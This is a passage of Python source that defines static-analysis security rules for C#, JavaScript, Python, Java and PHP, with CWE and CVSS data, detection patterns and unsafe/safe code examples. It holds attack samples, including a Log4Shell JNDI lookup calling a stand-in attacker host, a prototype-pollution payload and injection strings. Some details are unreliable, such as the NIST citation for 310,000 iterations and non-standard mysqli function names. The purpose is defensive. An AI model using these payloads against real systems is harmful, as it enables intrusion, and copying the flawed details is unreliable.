# ════════════════════════════════════════════════════════════════════════════
wr("csharp","csharp_cors_wildcard",RE["cors"],"Misconfiguration","CWE-942","A05:2021-Security Misconfiguration",
   7.4,"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N","High","Tentative",
   "CORS Misconfiguration: AllowAnyOrigin() or WithOrigins(*) applied to authenticated ASP.NET Core endpoints",
   ("The ASP.NET Core CORS policy is configured with AllowAnyOrigin() or a wildcard origin. "
    "When combined with AllowCredentials(), this violates the CORS specification and modern "
    "browsers block such responses. However, if misconfigured endpoints reflect the Origin "
    "header or serve public keys/tokens, attackers can exploit cross-origin resource sharing "
    "to steal sensitive API responses."),
   CS_SRC,["AllowAnyOrigin()","WithOrigins(\"*\")","AllowAnyOrigin().AllowCredentials()"],["WithOrigins(","allowedOrigins"],
   ("Define an explicit list of trusted origins. Never combine AllowAnyOrigin with AllowCredentials.\n\n"
    "UNSAFE:\n"
    "  policy.AllowAnyOrigin().AllowCredentials();  /* rejected by browsers, config error */\n"
    "  policy.AllowAnyOrigin();  /* OK for public APIs only */\n\n"
    "SAFE:\n"
    "  policy.WithOrigins(\"https://app.example.com\", \"https://admin.example.com\")\n"
    "        .AllowCredentials()\n"
    "        .WithMethods(\"GET\", \"POST\");\n\n"
    "See ASP.NET Core CORS documentation and OWASP HTTP Headers Reference Cheat Sheet.")
)

wr("csharp","csharp_second_order_sqli",RE["2nd_sqli"],"SQLi","CWE-89","A03:2021-Injection",
   9.8,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","Critical","Confirmed",
   "Second-Order SQL Injection: value from database reader concatenated into raw SQL query",
   ("A value read from the database via SqlDataReader.GetString() or similar is concatenated "
    "directly into a subsequent SQL query string passed to FromSqlRaw() or ExecuteSqlRaw(). "
    "The stored value may contain an injected SQL payload from a prior user request. The "
    "second query executes the injection without parameterization, enabling full SQL injection."),
   DB_CS,["FromSqlRaw(\"","ExecuteSqlRaw(\"","cmd.CommandText +=","sqlQuery +="],["FromSqlInterpolated($","SqlParameter("],
   ("Parameterize ALL queries including those using database-sourced values.\n\n"
    "UNSAFE:\n"
    "  string username = reader.GetString(0);\n"
    "  ctx.Users.FromSqlRaw(\"SELECT * FROM logs WHERE user = '\" + username + \"'\");\n\n"
    "SAFE:\n"
    "  string username = reader.GetString(0);\n"
    "  ctx.Users.FromSqlInterpolated($\"SELECT * FROM logs WHERE user = {username}\");\n\n"
    "Database-sourced data must be treated as untrusted. See OWASP SQL Injection Prevention Cheat Sheet.")
)

wr("csharp","csharp_weak_pbkdf2",RE["pbkdf2"],"Weak Crypto","CWE-916","A02:2021-Cryptographic Failures",
   7.5,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","High","Confirmed",
   "Weak key derivation via Rfc2898DeriveBytes with iteration count below NIST SP 800-132 minimum",
   ("The application derives a password hash or encryption key using Rfc2898DeriveBytes (PBKDF2) "
    "with an iteration count below 310,000 (NIST SP 800-132 recommendation for PBKDF2-SHA256). "
    "Low iteration counts dramatically accelerate offline dictionary attacks. At 1,000 iterations, "
    "modern GPUs can test billions of passwords per second, cracking common passwords in seconds."),
   [],["new Rfc2898DeriveBytes(","Rfc2898DeriveBytes(password"],["310000","HashAlgorithmName.SHA512"],
   ("Increase iterations to >= 310,000 for PBKDF2-SHA256, or switch to bcrypt/Argon2.\n\n"
    "UNSAFE:\n"
    "  var pbkdf2 = new Rfc2898DeriveBytes(password, salt, 1000);  /* far too low */\n\n"
    "SAFE:\n"
    "  var pbkdf2 = new Rfc2898DeriveBytes(\n"
    "      password, salt, 310000, HashAlgorithmName.SHA256);\n\n"
    "BETTER (.NET 6+): Use Microsoft.AspNetCore.Identity which handles hashing with appropriate defaults. "
    "See NIST SP 800-132 and OWASP Password Storage Cheat Sheet.")
)

wr("csharp","csharp_hardcoded_jwt_secret",RE["secret"],"Hardcoded Secret","CWE-798","A07:2021-Identification and Authentication Failures",
   9.8,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","Critical","Confirmed",
   "Hardcoded JWT signing key — attackers with binary or source access can forge any JWT token",
   ("The JWT HMAC signing key is embedded as a string literal in C# source code. The entire "
    "security of JWT-based authentication depends on the key's secrecy. A hardcoded key exposed "
    "via source code leak, decompilation, or disassembly allows anyone to sign arbitrary JWT "
    "payloads as any user, including administrators, without needing credentials."),
   [],['new SymmetricSecurityKey(Encoding.UTF8.GetBytes("','SecurityKey("','signingKey = "secret'],["Configuration[","Environment.GetEnvironmentVariable("],
   ("Load the JWT key from configuration or environment variables. Never embed it in source.\n\n"
    "UNSAFE:\n"
    "  var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(\"mySuperSecretKey!\"));\n\n"
    "SAFE:\n"
    "  var keyStr = configuration[\"JwtSettings:Secret\"]  // from appsettings.json, secrets.json, or env\n"
    "      ?? throw new InvalidOperationException(\"JWT secret not configured\");\n"
    "  var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(keyStr));\n\n"
    "Use .NET User Secrets in development and Azure Key Vault / AWS SSM in production. "
    "See OWASP Secrets Management Cheat Sheet.")
)

wr("csharp","csharp_reflection_load_type",RE["csharp_refl"],"Code Injection","CWE-470","A03:2021-Injection",
   9.8,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","Critical","Confirmed",
   "Code Injection via Type.GetType(userInput) or Assembly.Load() with user-controlled class name",
   ("User-controlled data is passed to Type.GetType(), Activator.CreateInstance(), or "
    "Assembly.Load() to dynamically instantiate a class by name. An attacker can specify a "
    "class name referencing a known gadget type (System.Diagnostics.Process, "
    "System.IO.File) to instantiate and invoke security-critical operations via reflection."),
   CS_SRC,["Type.GetType(","Assembly.Load(","Activator.CreateInstance(","Assembly.LoadFrom("],["allowedTypes.Contains(","Type.GetType(allowedName"],
   ("Validate user-controlled type names against a strict allowlist before using reflection.\n\n"
    "UNSAFE:\n"
    "  var type = Type.GetType(Request.Query[\"className\"]);\n"
    "  Activator.CreateInstance(type);\n\n"
    "SAFE:\n"
    "  var allowed = new HashSet<string> { \"MyApp.Plugins.SafePlugin\", \"MyApp.Plugins.OtherPlugin\" };\n"
    "  if (!allowed.Contains(Request.Query[\"className\"])) throw new SecurityException();\n"
    "  var type = Type.GetType(Request.Query[\"className\"]);\n"
    "  Activator.CreateInstance(type);\n\n"
    "Prefer a registered service factory over reflection on arbitrary user-supplied types. "
    "See OWASP Injection Prevention Cheat Sheet.")
)

# ════════════════════════════════════════════════════════════════════════════
# JavaScript — 5 rules
# ════════════════════════════════════════════════════════════════════════════
wr("javascript","js_cors_wildcard",RE["cors"],"Misconfiguration","CWE-942","A05:2021-Security Misconfiguration",
   7.4,"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N","High","Tentative",
   "CORS Misconfiguration: Express middleware setting Access-Control-Allow-Origin to * on authenticated API",
   ("The Express.js application uses the cors() middleware with origin: '*' or manually sets "
    "the Access-Control-Allow-Origin: * header on routes that handle authenticated user data. "
    "Any website can make cross-origin requests to the API and read responses if the client "
    "does not send credentials. Combining with reflected origin enables full credential bypass."),
   JS_SRC,["cors({ origin: '*' })","cors({origin:'*'})","'Access-Control-Allow-Origin', '*'"],["allowedOrigins","origin: function("],
   ("Use an explicit origin allowlist instead of wildcard.\n\n"
    "UNSAFE:\n"
    "  app.use(cors({ origin: '*' }));\n"
    "  res.header('Access-Control-Allow-Origin', '*');\n\n"
    "SAFE:\n"
    "  const allowed = ['https://app.example.com', 'https://admin.example.com'];\n"
    "  app.use(cors({\n"
    "    origin: (origin, cb) => cb(null, allowed.includes(origin)),\n"
    "    credentials: true\n"
    "  }));\n\n"
    "See OWASP CORS guide and NPM cors package documentation.")
)

wr("javascript","js_websocket_xss",RE["ws_xss"],"XSS","CWE-79","A03:2021-Injection",
   6.1,"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","High","Confirmed",
   "XSS via WebSocket message data inserted into DOM via innerHTML or document.write()",
   ("The application receives WebSocket messages and inserts event.data or ws.message "
    "directly into the DOM via innerHTML, outerHTML, or document.write() without sanitization. "
    "Any attacker who can influence WebSocket message content — via a MitM, XSS on the "
    "WebSocket server, or a rogue message origin — can inject arbitrary JavaScript."),
   ["ws.onmessage","socket.on('message'","new WebSocket("],["innerHTML =","document.write(","outerHTML ="],["DOMPurify.sanitize(","textContent ="],
   ("Sanitize WebSocket data before DOM insertion or use safe DOM APIs.\n\n"
    "UNSAFE:\n"
    "  ws.onmessage = (event) => {\n"
    "      document.getElementById('chat').innerHTML += event.data;  /* XSS */\n"
    "  };\n\n"
    "SAFE:\n"
    "  ws.onmessage = (event) => {\n"
    "      const safe = DOMPurify.sanitize(event.data);\n"
    "      document.getElementById('chat').innerHTML += safe;\n"
    "      // Or use textContent for plain text only:\n"
    "      document.getElementById('chat').textContent += event.data;\n"
    "  };\n\n"
    "Validate WebSocket origin and use structured JSON messages instead of raw HTML. "
    "See OWASP HTML5 Security Cheat Sheet.")
)

wr("javascript","js_prototype_pollution_merge",RE["proto"],"Prototype Pollution","CWE-1321","A03:2021-Injection",
   8.8,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","High","Confirmed",
   "Prototype Pollution via deep object merge or assign with user-controlled __proto__ or constructor key",
   ("A deep merge or recursive assign function processes user-controlled objects without "
    "sanitizing keys. When user input contains __proto__, constructor.prototype, or "
    "Object.prototype as a key path, the merge writes to JavaScript's global object prototype. "
    "This corrupts all objects in the process, enabling property injection that bypasses "
    "authentication checks or alters application behavior application-wide."),
   JS_SRC,["merge(","_.merge(","deepMerge(","Object.assign(dest","extend(target, source"],["hasOwnProperty(key)","Object.create(null)"],
   ("Sanitize merge keys and use Object.create(null) targets to prevent prototype chain writes.\n\n"
    "UNSAFE:\n"
    "  function merge(dst, src) {\n"
    "    for (let key in src) dst[key] = src[key];  /* writes to __proto__ */\n"
    "  }\n"
    "  merge({}, JSON.parse(req.body));  /* attacker sends {\"__proto__\":{\"isAdmin\":true}} */\n\n"
    "SAFE:\n"
    "  function safeMerge(dst, src) {\n"
    "    for (let key of Object.keys(src)) {  /* own keys only */\n"
    "      if (key === '__proto__' || key === 'constructor') continue;\n"
    "      dst[key] = src[key];\n"
    "    }\n"
    "  }\n\n"
    "Use lodash >= 4.17.21 which has built-in prototype pollution protection. "
    "See OWASP Prototype Pollution Prevention Cheat Sheet.")
)

wr("javascript","js_weak_pbkdf2",RE["pbkdf2"],"Weak Crypto","CWE-916","A02:2021-Cryptographic Failures",
   7.5,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","High","Confirmed",
   "Weak password hashing via crypto.pbkdf2() with iteration count below NIST SP 800-132 minimum",
   ("The Node.js application uses crypto.pbkdf2() or crypto.pbkdf2Sync() with an iteration "
    "count well below the NIST SP 800-132 (2023) recommendation of 310,000 for PBKDF2-SHA256. "
    "An attacker with access to the password database can use GPU-accelerated tools (Hashcat) "
    "to crack low-iteration PBKDF2 hashes at millions of attempts per second."),
   [],["crypto.pbkdf2(password","crypto.pbkdf2Sync(password"],["bcrypt.hash(","argon2.hash("],
   ("Use bcrypt or Argon2id for password hashing. If PBKDF2 is required, use >= 310,000 iterations.\n\n"
    "UNSAFE:\n"
    "  crypto.pbkdf2(password, salt, 1000, 64, 'sha256', (err, key) => { ... })\n\n"
    "SAFE (PBKDF2):\n"
    "  crypto.pbkdf2(password, salt, 310000, 64, 'sha256', (err, key) => { ... })\n\n"
    "BETTER (bcrypt):\n"
    "  const bcrypt = require('bcrypt');\n"
    "  const hash = await bcrypt.hash(password, 12);\n\n"
    "See NIST SP 800-132, OWASP Password Storage Cheat Sheet, and Node.js crypto documentation.")
)

wr("javascript","js_hardcoded_api_key",RE["secret"],"Hardcoded Secret","CWE-798","A07:2021-Identification and Authentication Failures",
   9.8,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","Critical","Confirmed",
   "Hardcoded API key or secret token embedded in JavaScript source code",
   ("An API key, secret token, or authentication credential is hardcoded as a string literal "
    "in JavaScript source. Client-side JS is publicly accessible and any credential embedded "
    "in it is trivially extractable via browser DevTools. Server-side Node.js secrets in "
    "source files are exposed via version control, container image extraction, or process dumps."),
   [],['apiKey = "','secretKey = "','authToken = "','privateKey = "','client_secret = "'],["process.env.","config.get("],
   ("Store all secrets in environment variables accessed via process.env. Never in JS source.\n\n"
    "UNSAFE:\n"
    "  const apiKey = 'sk_live_ABCdef123456789';\n\n"
    "SAFE:\n"
    "  const apiKey = process.env.API_KEY;\n"
    "  if (!apiKey) throw new Error('API_KEY environment variable required');\n\n"
    "Never commit .env files. Use dotenv for local development and secrets managers (Vault, AWS SSM) "
    "for production. Scan with git-secrets or detect-secrets. See OWASP Secrets Management Cheat Sheet.")
)

# ════════════════════════════════════════════════════════════════════════════
# Python — 5 rules
# ════════════════════════════════════════════════════════════════════════════
wr("python","python_cors_wildcard",RE["cors"],"Misconfiguration","CWE-942","A05:2021-Security Misconfiguration",
   7.4,"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N","High","Tentative",
   "CORS Misconfiguration: Flask-CORS or Django-CORS configured with wildcard origin on authenticated API",
   ("The Python web application configures CORS with origins='*' or CORS_ALLOW_ALL_ORIGINS=True "
    "on API endpoints that handle authenticated user data. Cross-origin requests from any website "
    "can read API responses. If the origin is reflected back from the request without validation, "
    "attackers can bypass intended domain restrictions and steal user data via CSRF-like attacks."),
   PY_SRC,["CORS(app, resources","CORS_ALLOW_ALL_ORIGINS = True","origins='*'","origins=\"*\""],["CORS_ALLOWED_ORIGINS","allowed_origins"],
   ("Specify explicit allowed origins. Never use wildcard on authenticated endpoints.\n\n"
    "UNSAFE:\n"
    "  from flask_cors import CORS\n"
    "  CORS(app, resources={r'/api/*': {'origins': '*'}})\n\n"
    "SAFE:\n"
    "  CORS(app, resources={r'/api/*': {\n"
    "      'origins': ['https://app.example.com', 'https://admin.example.com'],\n"
    "      'supports_credentials': True\n"
    "  }})\n\n"
    "See Flask-CORS documentation and OWASP CORS configuration guidance.")
)

wr("python","python_weak_pbkdf2",RE["pbkdf2"],"Weak Crypto","CWE-916","A02:2021-Cryptographic Failures",
   7.5,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","High","Confirmed",
   "Weak password hashing via hashlib.pbkdf2_hmac() with iteration count below NIST SP 800-132 minimum",
   ("The application calls hashlib.pbkdf2_hmac() with an iteration count below 310,000 "
    "(NIST SP 800-132 2023 recommendation for PBKDF2-SHA256). GPU-accelerated cracking tools "
    "like Hashcat can test billions of PBKDF2 iterations per second. A hash with 10,000 "
    "iterations is 31x weaker than the current minimum, making common passwords crackable "
    "in minutes after a database breach."),
   [],["hashlib.pbkdf2_hmac(","pbkdf2_hmac('sha"],["argon2","bcrypt.hashpw("],
   ("Use argon2-cffi or bcrypt for password hashing. If PBKDF2 is required, use >= 310,000 iterations.\n\n"
    "UNSAFE:\n"
    "  hashlib.pbkdf2_hmac('sha256', password, salt, 10000)\n\n"
    "SAFE (PBKDF2):\n"
    "  hashlib.pbkdf2_hmac('sha256', password, salt, 310000)\n\n"
    "BETTER (Argon2id):\n"
    "  from argon2 import PasswordHasher\n"
    "  ph = PasswordHasher()\n"
    "  hash = ph.hash(password)\n\n"
    "See NIST SP 800-132, OWASP Password Storage Cheat Sheet, and argon2-cffi documentation.")
)

wr("python","python_jinja2_markup_bypass",RE["jinja"],"XSS","CWE-79","A03:2021-Injection",
   6.1,"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","High","Confirmed",
   "XSS via Jinja2 Markup() class wrapping user-controlled input to bypass auto-escaping",
   ("User-controlled data is wrapped with Jinja2's Markup() or markupsafe.Markup() class "
    "before being passed to a template. Markup() marks a string as safe, causing the Jinja2 "
    "auto-escape engine to render it raw without HTML encoding. An attacker can inject "
    "<script>alert(1)</script> or event handlers that execute in the victim's browser."),
   PY_SRC,["Markup(request","Markup(user","Markup(form","markupsafe.Markup("],["escape(","Markup.escape("],
   ("Never wrap user input in Markup(). Pass it as a plain string and let Jinja2 auto-escape it.\n\n"
    "UNSAFE:\n"
    "  from markupsafe import Markup\n"
    "  safe_name = Markup(request.args.get('name'))  /* bypasses auto-escape */\n"
    "  return render_template('page.html', name=safe_name)\n\n"
    "SAFE:\n"
    "  name = request.args.get('name')  /* plain string — auto-escaped by Jinja2 */\n"
    "  return render_template('page.html', name=name)\n\n"
    "Only use Markup() for values you have explicitly sanitized with Markup.escape() or bleach. "
    "See Jinja2 documentation on auto-escaping and OWASP XSS Prevention Cheat Sheet.")
)

wr("python","python_second_order_sqli",RE["2nd_sqli"],"SQLi","CWE-89","A03:2021-Injection",
   9.8,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","Critical","Confirmed",
   "Second-Order SQL Injection: database-sourced value re-used in raw SQL query without parameterization",
   ("A value previously stored in the database is retrieved via cursor.fetchone() or a Django "
    "queryset and then concatenated into a raw SQL query string using cursor.execute() with "
    "string formatting. An attacker who stored a SQL injection payload in an earlier request "
    "can trigger it when the stored value is used in this second-order query."),
   DB_PY,["cursor.execute(f\"","cursor.execute(\"SELECT.*%s\" % ","connection.execute(f'"],["cursor.execute(sql, (","session.execute(text(sql), {"],
   ("Parameterize every SQL query regardless of the data source.\n\n"
    "UNSAFE:\n"
    "  row = cursor.fetchone()\n"
    "  cursor.execute(f\"SELECT * FROM orders WHERE owner = '{row[0]}'\")  /* second-order SQLi */\n\n"
    "SAFE:\n"
    "  row = cursor.fetchone()\n"
    "  cursor.execute(\"SELECT * FROM orders WHERE owner = %s\", (row[0],))\n\n"
    "DB-sourced values are untrusted. Parameterize all dynamic SQL. "
    "See OWASP SQL Injection Prevention Cheat Sheet.")
)

wr("python","python_random_secret_key",RE["secret"],"Weak Crypto","CWE-338","A02:2021-Cryptographic Failures",
   7.5,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","High","Confirmed",
   "Weak randomness via random.random() or random.choice() used to generate Flask secret key or token",
   ("The application uses Python's random module (random.random(), random.choice(), random.randint()) "
    "to generate a Flask SECRET_KEY, session token, password reset token, or CSRF nonce. "
    "The random module uses a Mersenne Twister PRNG that is not cryptographically secure. "
    "An attacker can predict future output after observing a sufficient number of values."),
   [],["random.random()","random.choice(","random.randint(","random.randbytes("],["secrets.token_hex(","os.urandom("],
   ("Use the secrets module or os.urandom() for all security-sensitive random generation.\n\n"
    "UNSAFE:\n"
    "  import random, string\n"
    "  token = ''.join(random.choices(string.ascii_letters, k=32))  /* predictable */\n\n"
    "SAFE:\n"
    "  import secrets\n"
    "  token = secrets.token_hex(32)      # URL-safe hex token\n"
    "  token = secrets.token_urlsafe(32)  # URL-safe base64 token\n\n"
    "For Flask: app.secret_key = secrets.token_hex(32) "
    "See Python secrets module documentation and OWASP Cryptographic Storage Cheat Sheet.")
)

# ════════════════════════════════════════════════════════════════════════════
# Java — 5 rules
# ════════════════════════════════════════════════════════════════════════════
wr("java","java_cors_wildcard",RE["cors"],"Misconfiguration","CWE-942","A05:2021-Security Misconfiguration",
   7.4,"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N","High","Tentative",
   "CORS Misconfiguration: @CrossOrigin(origins=*) on Spring controller serving authenticated data",
   ("The Spring controller is annotated with @CrossOrigin(origins=\"*\") or "
    "WebMvcConfigurer.addCorsMappings() with allowedOrigins(\"*\") on endpoints that "
    "return user-specific data. A wildcard combined with allowCredentials(true) is rejected "
    "by browsers, but a reflected Origin header or misconfigured policy still allows CORS bypass."),
   JAVA_SRC,['@CrossOrigin(origins = "*")','@CrossOrigin("*")','allowedOrigins("*")','addAllowedOrigin("*")'],["allowedOrigins.contains(","@CrossOrigin(origins = {"],
   ("Use an explicit list of trusted origins. Never combine wildcard with allowCredentials.\n\n"
    "UNSAFE:\n"
    "  @CrossOrigin(origins = \"*\")  /* too broad for authenticated endpoints */\n"
    "  @RestController\n"
    "  public class UserController { ... }\n\n"
    "SAFE:\n"
    "  @CrossOrigin(origins = {\"https://app.example.com\", \"https://admin.example.com\"},\n"
    "               allowCredentials = \"true\")\n"
    "  @RestController\n"
    "  public class UserController { ... }\n\n"
    "See Spring CORS documentation and OWASP HTTP Headers Reference Cheat Sheet.")
)

wr("java","java_second_order_sqli",RE["2nd_sqli"],"SQLi","CWE-89","A03:2021-Injection",
   9.8,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","Critical","Confirmed",
   "Second-Order SQL Injection: ResultSet value concatenated into a subsequent SQL query string",
   ("A value retrieved from a database ResultSet via rs.getString() is concatenated directly "
    "into a new SQL query string. An attacker who previously stored a SQL injection payload "
    "in the database can trigger it when the stored value is re-used in this second-order query. "
    "First-order defenses (escaping at input time) do not protect against second-order injection."),
   DB_JAVA,["\"SELECT.*\" + rs.getString","\"UPDATE.*\" + entity.get","session.createQuery(\".*\" + row"],["setParameter(","preparedStatement"],
   ("Parameterize ALL SQL queries. Database-retrieved values are as untrusted as user input.\n\n"
    "UNSAFE:\n"
    "  String username = rs.getString(\"username\");\n"
    "  stmt.executeQuery(\"SELECT * FROM logs WHERE user = '\" + username + \"'\");\n\n"
    "SAFE:\n"
    "  String username = rs.getString(\"username\");\n"
    "  PreparedStatement ps = conn.prepareStatement(\"SELECT * FROM logs WHERE user = ?\");\n"
    "  ps.setString(1, username);\n"
    "  ps.executeQuery();\n\n"
    "See OWASP SQL Injection Prevention Cheat Sheet for second-order injection defense patterns.")
)

wr("java","java_weak_pbkdf2",RE["pbkdf2"],"Weak Crypto","CWE-916","A02:2021-Cryptographic Failures",
   7.5,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","High","Confirmed",
   "Weak key derivation via PBEKeySpec with iteration count below NIST SP 800-132 minimum (310,000)",
   ("The application uses javax.crypto.SecretKeyFactory with PBEKeySpec specifying an iteration "
    "count below 310,000 for PBKDF2-SHA256 (NIST SP 800-132 2023 recommendation). Password "
    "cracking tools (Hashcat) can test millions of PBKDF2-SHA256 iterations per second on "
    "consumer GPUs. Too few iterations make the entire password database crackable after breach."),
   [],["new PBEKeySpec(","PBEKeySpec(password"],["BCrypt.hashpw(","Argon2PasswordEncoder("],
   ("Use >= 310,000 iterations for PBKDF2-SHA256, or switch to bcrypt/Argon2id.\n\n"
    "UNSAFE:\n"
    "  KeySpec spec = new PBEKeySpec(password, salt, 1000, 256);  /* too low */\n\n"
    "SAFE:\n"
    "  KeySpec spec = new PBEKeySpec(password, salt, 310000, 256);\n\n"
    "BETTER (Spring Security):\n"
    "  Argon2PasswordEncoder encoder = Argon2PasswordEncoder.defaultsForSpringSecurity_v5_8();\n"
    "  String hash = encoder.encode(rawPassword);\n\n"
    "See NIST SP 800-132, OWASP Password Storage Cheat Sheet, and Spring Security docs.")
)

wr("java","java_unsafe_reflection",RE["refl"],"Code Injection","CWE-470","A03:2021-Injection",
   9.8,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","Critical","Confirmed",
   "Code Injection via Class.forName(userInput).newInstance() — arbitrary class instantiation via reflection",
   ("User-controlled input is passed to Class.forName() to dynamically load and instantiate "
    "a Java class. An attacker can specify any class available on the classpath, including "
    "ProcessBuilder, Runtime, or exploit gadgets from common libraries. Combined with method "
    "invocation via getDeclaredMethod(), this enables full remote code execution."),
   JAVA_SRC,["Class.forName(request","Class.forName(param","Class.forName(header",".newInstance()"],["allowedClasses.contains(","Class.forName(SAFE_CLASS"],
   ("Validate the class name against an allowlist before reflective instantiation.\n\n"
    "UNSAFE:\n"
    "  Class<?> cls = Class.forName(request.getParameter(\"class\"));\n"
    "  Object obj = cls.newInstance();\n\n"
    "SAFE:\n"
    "  Set<String> allowed = Set.of(\"com.myapp.plugins.SafePlugin\", \"com.myapp.plugins.Other\");\n"
    "  String className = request.getParameter(\"class\");\n"
    "  if (!allowed.contains(className)) throw new SecurityException();\n"
    "  Class<?> cls = Class.forName(className);\n"
    "  Object obj = cls.newInstance();\n\n"
    "Prefer a registered service factory (Spring DI) over reflection on user-controlled types. "
    "See OWASP Injection Prevention Cheat Sheet.")
)

wr("java","java_log4j_user_input",RE["log4j"],"Code Injection","CWE-917","A03:2021-Injection",
   10.0,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H","Critical","Confirmed",
   "Log4Shell (CVE-2021-44228): user-controlled input logged via Log4j 2.x enables JNDI remote code execution",
   ("User-controlled data (HTTP headers, query params, request body) is logged directly via "
    "Apache Log4j 2.x logger methods (logger.info(), logger.error(), logger.warn()). Log4j 2 "
    "processes lookup expressions like ${jndi:ldap://attacker.com/a} embedded in log messages. "
    "An attacker can trigger JNDI lookups leading to remote class loading and arbitrary Java code "
    "execution (CVE-2021-44228, CVSS 10.0)."),
   JAVA_SRC,["logger.info(request","logger.error(request","logger.warn(request","log.info(header","LOG.error(param"],["log4j2.formatMsgNoLookups","PatternLayout.noLookups"],
   ("Upgrade Log4j 2 to >= 2.17.1. Apply noLookups=true until upgrade is complete.\n\n"
    "UNSAFE:\n"
    "  logger.info(\"User-Agent: {}\", request.getHeader(\"User-Agent\"));  /* Log4Shell trigger */\n"
    "  logger.error(\"Login attempt: \" + request.getParameter(\"username\"));\n\n"
    "MITIGATE (JVM flag):\n"
    "  -Dlog4j2.formatMsgNoLookups=true  /* disables lookups in log messages */\n\n"
    "FIX:\n"
    "  Upgrade to Log4j 2.17.1+ (Java 8) or 2.12.4+ (Java 7)\n"
    "  Or migrate to SLF4J + Logback which is not affected.\n\n"
    "See Apache Log4j CVE-2021-44228 advisory and OWASP Logging Cheat Sheet.")
)

# ════════════════════════════════════════════════════════════════════════════
# PHP — 5 rules
# ════════════════════════════════════════════════════════════════════════════
wr("php","php_cors_wildcard",RE["cors"],"Misconfiguration","CWE-942","A05:2021-Security Misconfiguration",
   7.4,"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N","High","Tentative",
   "CORS Misconfiguration: PHP header() setting Access-Control-Allow-Origin to * on authenticated endpoint",
   ("The PHP application sets the Access-Control-Allow-Origin: * response header via header() "
    "on endpoints that return user-specific data or require authentication. Wildcard CORS "
    "allows any origin to read API responses in cross-origin requests. Combined with "
    "Allow-Credentials: true or a reflected Origin, this enables CORS-based data theft."),
   PHP_SRC,["header('Access-Control-Allow-Origin: *')","header(\"Access-Control-Allow-Origin: *\")"],["$allowed_origins","validateOrigin("],
   ("Validate the request Origin against an allowlist and reflect only permitted origins.\n\n"
    "UNSAFE:\n"
    "  header('Access-Control-Allow-Origin: *');\n\n"
    "SAFE:\n"
    "  $allowed = ['https://app.example.com', 'https://admin.example.com'];\n"
    "  $origin = $_SERVER['HTTP_ORIGIN'] ?? '';\n"
    "  if (in_array($origin, $allowed, true)) {\n"
    "      header('Access-Control-Allow-Origin: ' . $origin);\n"
    "      header('Access-Control-Allow-Credentials: true');\n"
    "  }\n\n"
    "Never reflect the Origin header without first validating it against the allowlist. "
    "See OWASP CORS configuration guide.")
)

wr("php","php_second_order_sqli",RE["2nd_sqli"],"SQLi","CWE-89","A03:2021-Injection",
   9.8,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","Critical","Confirmed",
   "Second-Order SQL Injection: value from mysqli_fetch_assoc() re-used in concatenated SQL query",
   ("A value retrieved from the database via mysqli_fetch_assoc(), pg_fetch_assoc(), or PDO fetch "
    "is concatenated directly into a subsequent SQL query. An attacker who previously stored a SQL "
    "injection payload (e.g., ' OR '1'='1) can trigger second-order execution when the stored value "
    "is used in a later query without parameterization."),
   DB_PHP,["mysqli_query($conn, \"SELECT.*\" . $row","pg_query($conn, \"SELECT.*\" . $result","$db->query(\".*\" . $row"],["mysqli_prepare(","$pdo->prepare(","pg_query_params("],
   ("Always parameterize SQL queries, even when the data comes from your own database.\n\n"
    "UNSAFE:\n"
    "  $row = mysqli_fetch_assoc($r);\n"
    "  mysqli_query($conn, \"SELECT * FROM logs WHERE user = '\" . $row['username'] . \"'\");\n\n"
    "SAFE:\n"
    "  $row = mysqli_fetch_assoc($r);\n"
    "  $stmt = mysqli_prepare($conn, \"SELECT * FROM logs WHERE user = ?\");\n"
    "  mysqli_bind_param($stmt, 's', $row['username']);\n"
    "  mysqli_execute($stmt);\n\n"
    "Treat database-sourced values as untrusted. See OWASP SQL Injection Prevention Cheat Sheet.")
)

wr("php","php_weak_pbkdf2",RE["pbkdf2"],"Weak Crypto","CWE-916","A02:2021-Cryptographic Failures",
   7.5,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","High","Confirmed",
   "Weak password hashing via PHP hash_pbkdf2() with iteration count below NIST SP 800-132 minimum",
   ("The application calls hash_pbkdf2() with an iteration count far below NIST SP 800-132's "
    "2023 recommendation of 310,000 for PBKDF2-SHA256. PHP's hash_pbkdf2() with 1,000 iterations "
    "allows GPU cracking tools to test billions of passwords per second, cracking common passwords "
    "from a breached database in seconds."),
   [],["hash_pbkdf2(","hash_pbkdf2('sha256'"],["password_hash(PASSWORD_BCRYPT","password_hash(PASSWORD_ARGON2ID"],
   ("Use password_hash() with PASSWORD_BCRYPT or PASSWORD_ARGON2ID instead of hash_pbkdf2().\n\n"
    "UNSAFE:\n"
    "  $hash = hash_pbkdf2('sha256', $password, $salt, 1000);\n\n"
    "SAFE (PBKDF2 at minimum iterations):\n"
